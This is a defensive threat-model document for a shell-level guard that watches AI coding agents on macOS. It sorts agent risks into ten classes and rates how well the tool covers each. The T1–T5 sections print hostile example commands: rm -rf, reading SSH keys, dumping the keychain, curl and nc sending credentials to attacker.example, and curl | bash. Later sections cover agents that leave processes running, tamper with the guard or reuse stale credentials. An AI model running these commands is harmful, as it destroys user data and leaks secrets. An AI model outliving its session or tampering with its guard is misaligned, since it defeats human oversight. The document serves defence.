# Threat Model: AI Coding Agents on a Local Machine

This document expands the high-level threat model in [SECURITY.md](../SECURITY.md) with
concrete examples of risky automated-agent behavior, and maps each threat class to what
Agentic Sandbox Sentry can and cannot do about it today.

The goal is honesty: knowing which failures the tool catches, which it only observes,
and which it can merely document is more useful than a long list of scary examples.

## Scope and assumptions

- The agent (Claude Code, Cursor, ChatGPT with shell access, etc.) runs commands in a
  zsh session where `sandbox-hooks.zsh` is loaded, on a single macOS machine.
- The agent is not assumed to be malicious. Most real incidents are well-intentioned
  agents making mistakes, following a poisoned prompt, or losing track of state.
- Sentry is a runtime guard, not a sandbox boundary. A determined attacker with code
  execution can bypass it (see "Out of scope" in SECURITY.md).

## Assets worth protecting

| Asset | Examples |
|---|---|
| Credentials | `~/.ssh`, `~/.gnupg`, `~/.aws`, Keychains, tokens in env vars and config files |
| User data and code | Home directory, project repos, anything `rm -rf` can reach |
| System integrity | `/etc`, `/System`, network configuration, launchd services |
| Network position | The machine as a pivot for exfiltration or lateral movement |
| Money and quota | API keys with billing attached; tool budgets the agent can spend |
| The guard itself | Sentry's rules, logs, and baseline (see selfguard in SECURITY.md) |

## Threat classes

Status legend: **Enforced** (detected and blockable today), **Observed** (visible in
logs/monitoring but not reliably blocked), **Documented** (a real risk this tool cannot
see from the shell layer; listed so users plan for it elsewhere).

### T1. Destructive filesystem operations — Enforced

The classic case: an agent "cleans up" the wrong directory.

```
rm -rf ~/Documents            # wrong target after a bad $VAR expansion
rm -rf "$PROJECT_DIR"         # PROJECT_DIR is empty → rm -rf /
python3 -c "import shutil; shutil.rmtree('/Users/me')"
```

Coverage: `rm`/`rmdir` outside allowed project directories is blocked in `soft-block`
and `hard` modes, including `exec`, `bash -c`, and language one-liner wrappers.

### T2. Credential and sensitive-path access — Enforced

```
cat ~/.ssh/id_rsa
cp -r ~/.gnupg /tmp/backup
security dump-keychain
```

Coverage: access to `~/.ssh`, `~/.gnupg`, Keychains, `/etc`, `/System` is detected and
blocked. fswatch monitoring adds a second, hook-independent detection layer.

### T3. Privilege escalation — Enforced

Any `sudo` is blocked. Agents rarely have a legitimate reason to escalate, and a single
`sudo` mistake converts every other threat class from "user-level" to "system-level".

### T4. Network exfiltration — Observed / partially enforced

```
curl -X POST -d @~/.aws/credentials https://attacker.example
scp ~/.ssh/id_rsa remote:/tmp/
nc attacker.example 4444 < secrets.txt
```

Coverage: reads of sensitive paths are blocked (T2), which removes the common payloads.
The egress watcher observes outbound attempts, and `hard` mode can cut the network
entirely. But arbitrary uploads of *non-sensitive-path* data are not blocked — a file
already readable in an allowed project dir can be exfiltrated.

### T5. Remote code execution one-liners — Enforced

```
curl https://example.com/install.sh | bash
```

`curl | sh/bash/zsh` patterns are blocked, including inside subshells and TTY wrappers.

### T6. Unintended background process execution — Observed

*Credit: [@Keesan12](https://github.com/Keesan12) in [#5](https://github.com/Hellotravisss/agentic-sandbox-sentry/issues/5).*

Agents start servers, watchers, and browser sessions to do their work — and leave them
behind when a run fails or the context window moves on:

```
nohup python server.py &     # never killed after the task is "done"
npm run dev &                # orphaned dev server holding a port
headless browser tabs left logged in to a production dashboard
```

Orphans are not just untidy: they hold credentials, ports, and file handles long after
anyone is watching them.

Coverage: TTY/background wrappers (`nohup`, `script`, `expect`) around dangerous
commands are blocked. Enforcement can freeze suspicious processes (`kill -STOP`).
But a benign-looking background process is allowed to start, and Sentry does not
currently track "processes started during an agent session that outlived it". That
tracking is a good candidate for a future session-heartbeat feature.

### T7. Tampering with the guard itself — Enforced

Covered in depth in [SECURITY.md](../SECURITY.md): selfguard monitors Sentry's own
files and baseline integrity, and severe tampering can trigger enforcement.

### T8. Stale session and credential authority reuse — Documented

*Credit: @Keesan12 in #5.*

An agent holds a logged-in browser session, API token, or cloud context from an earlier
step. The target changes — different repo, different account, production instead of
staging — but the old authority is silently reused:

```
# Earlier: agent authenticated gcloud against the staging project.
# Later prompt: "clean up unused instances" — runs against whatever
# project the stale credential still points at.
```

Coverage: none at the shell layer — the commands look identical whether the session is
fresh or stale. Mitigations live outside Sentry: short-lived credentials, separate
profiles per environment, and explicit re-authentication steps in agent workflows.
Documented here so users do not assume Sentry covers it.

### T9. Unbounded retries and budget burn — Documented

*Credit: @Keesan12 in #5.*

An agent loops on a failing step — retrying an API call, re-running a test suite,
re-fetching a page — consuming API budget and tool quota without producing new
evidence. No single command is dangerous, so per-command rules never fire.

Coverage: the audit log is the mitigation today: `sentryctl stats` makes high-frequency
repetition visible after the fact. A rate-based rule ("same command ≥ N times in M
minutes → warn") would fit Sentry's architecture and is tracked as future work.

### T10. Credential-bearing debug artifacts — Partially enforced

*Credit: @Keesan12 in #5.*

Agents save screenshots, HTTP dumps, and verbose logs as "debug artifacts". Those
artifacts capture session cookies, tokens in URLs, and API keys in headers — then sit
unencrypted in a project directory that later gets committed or uploaded.

Coverage: direct reads of credential stores are blocked (T2), and fswatch flags writes
to sensitive paths. But Sentry cannot see that a screenshot *contains* a token. Partial
mitigations: keep agent scratch/artifact directories out of allowed-commit paths,
gitignore them, and treat any agent-produced artifact as sensitive by default.

## Coverage matrix

| # | Threat | audit | warn | soft-block | hard | Status |
|---|---|---|---|---|---|---|
| T1 | Destructive filesystem ops | log | log+warn | block | block+enforce | Enforced |
| T2 | Credential/sensitive-path access | log | log+warn | block | block+enforce | Enforced |
| T3 | Privilege escalation (`sudo`) | log | log+warn | block | block+enforce | Enforced |
| T4 | Network exfiltration | log (egress watch) | log+warn | partial | network cut | Observed |
| T5 | `curl \| sh` remote execution | log | log+warn | block | block+enforce | Enforced |
| T6 | Orphaned background processes | — | — | wrapper block only | freeze | Observed |
| T7 | Guard tampering | log | log | selfguard | selfguard+enforce | Enforced |
| T8 | Stale session/credential reuse | — | — | — | — | Documented |
| T9 | Unbounded retries / budget burn | log volume | log volume | — | — | Documented |
| T10 | Credential-bearing artifacts | fswatch | fswatch | partial | partial | Partial |

## What this model deliberately excludes

See "Out of Scope" in [SECURITY.md](../SECURITY.md): kernel-level attacks, attacks from
other users or root, supply-chain compromise of dependencies, and anything outside the
hooked shell session. Sentry reduces blast radius; it does not replace VMs, containers,
least-privilege credentials, or backups.

## Contributing new threats

If you have seen an agent failure mode not listed here — especially the quiet,
expensive kind rather than the dramatic kind — please open an issue with a concrete
example. The bar for inclusion is "this happened, or plausibly happens, in real agent
runs", not theoretical severity.
